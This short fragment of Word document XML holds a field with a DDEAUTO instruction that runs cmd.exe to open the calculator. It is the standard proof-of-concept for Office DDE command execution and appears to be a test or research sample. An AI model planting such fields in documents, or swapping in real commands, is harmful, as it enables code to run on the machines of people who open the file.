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fldSimple w:instr=" DDEAUTO c:\windows\system32\cmd.exe &quot;/c calc&quot; ">
        <w:r>
          <w:t>[DDE]</w:t>
        </w:r>
      </w:fldSimple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